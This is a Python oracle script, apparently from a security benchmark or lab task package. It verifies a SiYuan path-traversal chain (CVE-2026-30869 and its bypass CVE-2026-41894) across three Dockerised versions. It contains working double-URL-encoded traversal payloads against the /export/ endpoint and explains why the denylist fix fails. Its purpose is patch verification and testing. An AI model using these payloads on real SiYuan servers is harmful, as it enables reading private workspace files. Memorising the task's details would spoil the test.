#!/usr/bin/env python3
"""Flag differential oracle for siyuan-cve-2026-41894.

Chain: CVE-2026-30869 (path traversal via double URL encoding in /export/)
     -> CVE-2026-41894 (denylist-only fix bypass; temp files still readable).

V0 = SiYuan 3.5.9   (serveExport has no IsSensitivePath check)
V1 = SiYuan 3.5.10  (CVE-2026-30869 fix: IsSensitivePath denylist; temp/ unblocked) <- target
V2 = SiYuan 3.6.5   (CVE-2026-41894 fix: IsSubPath(exportBaseDir, fullPath))

Go's HTTP server decodes %25 once during request parsing; serveExport's redundant
url.PathUnescape() decodes again, so /export/%252e%252e/... escapes the export
dir. The entrypoint plants PCB_FLAG into workspace/conf/pcb_secret.txt (seed
channel, blocked by the conf/ denylist on v1) and workspace/temp/pcb_flag.txt
(residual channel, next to the export dir; only the IsSubPath check on v2 stops
it).

Auth: POST /api/system/loginAuth {"authCode":"pcb"} -> cookie.
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import sy_util as u  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"


def _wait_ready(version: str, timeout: int = 180) -> bool:
    base = u.BASE[version]
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{base}/api/system/version", timeout=5) as r:
                if r.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(5)
    return False


def seed_exploit(*, version="v0") -> dict:
    if not _wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    status, body = u.get_export(version, "%252e%252e/%252e%252e/conf/pcb_secret.txt")
    return {"ok": FLAG in body, "status": status, "body": body[:100]}


def residual_exploit(*, version="v1") -> dict:
    if not _wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    status, body = u.get_export(version, "%252e%252e/pcb_flag.txt")
    return {"ok": FLAG in body, "status": status, "body": body[:100]}


def gate() -> dict:
    s0 = seed_exploit(version="v0")
    s1 = seed_exploit(version="v1")
    r1 = residual_exploit(version="v1")
    r2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": s0["ok"],
        "seed_closed_on_v1": not s1["ok"],
        "residual_reaches_flag_on_v1": r1["ok"],
        "residual_blocked_on_v2": not r2["ok"],
        "seed_v0_status": s0["status"],
        "seed_v1_status": s1["status"],
        "residual_v1_status": r1["status"],
        "residual_v2_status": r2["status"],
        "passed": all([s0["ok"], not s1["ok"], r1["ok"], not r2["ok"]]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = ["--profile", "v0", "--profile", "v1", "--profile", "v2"]
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
